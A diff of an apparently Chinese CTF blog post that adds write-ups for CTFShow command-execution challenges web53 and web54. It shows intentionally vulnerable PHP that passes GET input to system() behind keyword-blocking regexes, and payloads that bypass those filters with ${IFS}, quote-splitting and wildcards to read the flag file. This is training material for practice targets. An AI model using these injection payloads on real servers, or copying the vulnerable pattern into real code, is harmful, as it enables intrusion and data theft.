@@ -142,12 +142,16 @@
 <meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web52_1.png">
 <meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web52_2.png">
 <meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web52_3.png">
+<meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web53.png">
+<meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web54.png">
+<meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web54_1.png">
+<meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web54_2.png">
 <meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web81.png">
 <meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web81_1.png">
 <meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web81_2.png">
 <meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web81_3.png">
 <meta property="og:image" content="https://czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web81_4.png">
-<meta property="og:updated_time" content="2021-07-23T03:22:44.642Z">
+<meta property="og:updated_time" content="2021-07-23T08:12:59.254Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CTFShow Web笔记">
 <meta name="twitter:description" content="ctfshow web笔记web34——命令执行源码:">
@@ -464,7 +468,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2021-07-23 11:22:44" itemprop="dateModified" datetime="2021-07-23T11:22:44+08:00">2021-07-23</time>
+                <time title="修改时间：2021-07-23 16:12:59" itemprop="dateModified" datetime="2021-07-23T16:12:59+08:00">2021-07-23</time>
               
             
           </span>
@@ -530,7 +534,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">11k</span>
+                <span title="本文字数">12k</span>
               
 
               
@@ -544,7 +548,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">10 分钟</span>
+                <span title="阅读时长">11 分钟</span>
               
             </div>
           
@@ -687,7 +691,7 @@
 </li>
 </ol>
 <p>所以此题要把 &gt;/dev/null 2&gt;&amp;1 这部分内容截断:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php%<span class="number">0</span>a <span class="comment">// %0a = 回车</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span> <span class="comment">// %26 = &amp;</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>%<span class="number">26</span> <span class="comment">// %26%26 = &amp;&amp;</span></span><br><span class="line">?c=tac flag.php|| <span class="comment">// || = ||</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php%<span class="number">0</span>a <span class="comment">// %0a = 回车</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span> <span class="comment">// %26 = &amp;</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>%<span class="number">26</span> <span class="comment">// %26%26 = &amp;&amp;</span></span><br><span class="line">?c=tac flag.php|| <span class="comment">// || = ||</span></span><br><span class="line">?c=tac flag.php;ls</span><br></pre></td></tr></table></figure>
 
 <p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web42.png" alt></p>
 <h2 id="web43——命令执行——⇡"><a href="#web43——命令执行——⇡" class="headerlink" title="web43——命令执行——⇡"></a>web43——命令执行——⇡</h2><p>源码：</p>
@@ -755,7 +759,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=t<span class="string">''</span>ac&lt;f<span class="string">''</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=t<span class="string">''</span>ac&lt;&gt;f<span class="string">''</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=nl&lt;f<span class="string">''</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=nl&lt;&gt;f<span class="string">''</span>lag.php%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>
 
 <p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web51.png" alt></p>
-<h2 id="web52——命令执行"><a href="#web52——命令执行" class="headerlink" title="web52——命令执行"></a>web52——命令执行</h2><p>源码:</p>
+<h2 id="web52——命令执行——⇡"><a href="#web52——命令执行——⇡" class="headerlink" title="web52——命令执行——⇡"></a>web52——命令执行——⇡</h2><p>源码:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>此题相较于上一题 多过滤了 <strong>&lt; &gt;</strong> 且解除了对 <strong>$</strong> 的过滤:</p>
@@ -775,6 +779,31 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ta<span class="string">''</span>c$&#123;IFS&#125;/fl<span class="string">''</span>ag%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>
 
 <p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web52_3.png" alt></p>
+<h2 id="web53——命令执行——⇡"><a href="#web53——命令执行——⇡" class="headerlink" title="web53——命令执行——⇡"></a>web53——命令执行——⇡</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此题相较于上一题 多 过滤了 <strong>wget</strong> ; 且没有了“黑洞”: &gt;/dev/null 2&gt;&amp;1</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=ta<span class="string">''</span>c$&#123;IFS&#125;fl<span class="string">''</span>ag.php</span><br><span class="line">?c=nl$&#123;IFS&#125;fl<span class="string">''</span>ag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web53.png" alt></p>
+<h2 id="web54——命令执行"><a href="#web54——命令执行" class="headerlink" title="web54——命令执行"></a>web54——命令执行</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这过滤的……</p>
+<p><strong>方法一:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php = 8位, f???????</span></span><br><span class="line">?c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure>
+
+<p>bin为binary:主要是系统的: cat, cp, chmod, dmesg, gzip, kill, ls, mkdir, more, mount, rm, su, tar, 等等</p>
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web54.png" alt></p>
+<p><strong>方法二:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 mv 命令将 flag.php 重命名位 a.txt</span></span><br><span class="line">?C=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br><span class="line">?c=ls</span><br></pre></td></tr></table></figure>
+
+<p>查看目录下内容是否将 flag.php 更名位 a.txt</p>
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web54_1.png" alt></p>
+<p>查看 a.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//349624a8-72d7-****-****-4024d09777f4.challenge.ctf.show:8080/a.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web54_2.png" alt></p>
 <h2 id="web81——文件包含——日志shell"><a href="#web81——文件包含——日志shell" class="headerlink" title="web81——文件包含——日志shell"></a>web81——文件包含——日志shell</h2><p>源码:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -1071,7 +1100,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-web笔记"><span class="nav-number">1.</span> <span class="nav-text">ctfshow web笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web34——命令执行"><span class="nav-number">1.1.</span> <span class="nav-text">web34——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web35——命令执行"><span class="nav-number">1.2.</span> <span class="nav-text">web35——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web36——命令执行"><span class="nav-number">1.3.</span> <span class="nav-text">web36——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web37——命令执行——日志shell"><span class="nav-number">1.4.</span> <span class="nav-text">web37——命令执行——日志shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web38——命令执行——日志shell"><span class="nav-number">1.5.</span> <span class="nav-text">web38——命令执行——日志shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web39——命令执行"><span class="nav-number">1.6.</span> <span class="nav-text">web39——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web40——命令执行"><span class="nav-number">1.7.</span> <span class="nav-text">web40——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web41——命令执行"><span class="nav-number">1.8.</span> <span class="nav-text">web41——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web42——命令执行——-gt-dev-null-2-gt-amp-1"><span class="nav-number">1.9.</span> <span class="nav-text">web42——命令执行—— &gt;/dev/null 2&gt;&amp;1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web43——命令执行——⇡"><span class="nav-number">1.10.</span> <span class="nav-text">web43——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web44——命令执行——⇡"><span class="nav-number">1.11.</span> <span class="nav-text">web44——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web45——命令执行——⇡"><span class="nav-number">1.12.</span> <span class="nav-text">web45——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web46——命令执行——⇡"><span class="nav-number">1.13.</span> <span class="nav-text">web46——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web47——命令执行——⇡"><span class="nav-number">1.14.</span> <span class="nav-text">web47——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web48——命令执行——⇡"><span class="nav-number">1.15.</span> <span class="nav-text">web48——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web49——命令执行——⇡"><span class="nav-number">1.16.</span> <span class="nav-text">web49——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web50——命令执行——⇡"><span class="nav-number">1.17.</span> <span class="nav-text">web50——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web51——命令执行——⇡"><span class="nav-number">1.18.</span> <span class="nav-text">web51——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web52——命令执行"><span class="nav-number">1.19.</span> <span class="nav-text">web52——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web81——文件包含——日志shell"><span class="nav-number">1.20.</span> <span class="nav-text">web81——文件包含——日志shell</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-web笔记"><span class="nav-number">1.</span> <span class="nav-text">ctfshow web笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web34——命令执行"><span class="nav-number">1.1.</span> <span class="nav-text">web34——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web35——命令执行"><span class="nav-number">1.2.</span> <span class="nav-text">web35——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web36——命令执行"><span class="nav-number">1.3.</span> <span class="nav-text">web36——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web37——命令执行——日志shell"><span class="nav-number">1.4.</span> <span class="nav-text">web37——命令执行——日志shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web38——命令执行——日志shell"><span class="nav-number">1.5.</span> <span class="nav-text">web38——命令执行——日志shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web39——命令执行"><span class="nav-number">1.6.</span> <span class="nav-text">web39——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web40——命令执行"><span class="nav-number">1.7.</span> <span class="nav-text">web40——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web41——命令执行"><span class="nav-number">1.8.</span> <span class="nav-text">web41——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web42——命令执行——-gt-dev-null-2-gt-amp-1"><span class="nav-number">1.9.</span> <span class="nav-text">web42——命令执行—— &gt;/dev/null 2&gt;&amp;1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web43——命令执行——⇡"><span class="nav-number">1.10.</span> <span class="nav-text">web43——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web44——命令执行——⇡"><span class="nav-number">1.11.</span> <span class="nav-text">web44——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web45——命令执行——⇡"><span class="nav-number">1.12.</span> <span class="nav-text">web45——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web46——命令执行——⇡"><span class="nav-number">1.13.</span> <span class="nav-text">web46——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web47——命令执行——⇡"><span class="nav-number">1.14.</span> <span class="nav-text">web47——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web48——命令执行——⇡"><span class="nav-number">1.15.</span> <span class="nav-text">web48——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web49——命令执行——⇡"><span class="nav-number">1.16.</span> <span class="nav-text">web49——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web50——命令执行——⇡"><span class="nav-number">1.17.</span> <span class="nav-text">web50——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web51——命令执行——⇡"><span class="nav-number">1.18.</span> <span class="nav-text">web51——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web52——命令执行——⇡"><span class="nav-number">1.19.</span> <span class="nav-text">web52——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web53——命令执行——⇡"><span class="nav-number">1.20.</span> <span class="nav-text">web53——命令执行——⇡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web54——命令执行"><span class="nav-number">1.21.</span> <span class="nav-text">web54——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web81——文件包含——日志shell"><span class="nav-number">1.22.</span> <span class="nav-text">web81——文件包含——日志shell</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -1111,7 +1140,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">35k</span>
+    <span title="站点总字数">36k</span>
   
 
   
@@ -1120,7 +1149,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">32 分钟</span>
+    <span title="站点阅读时长">33 分钟</span>
   
 </div>
 
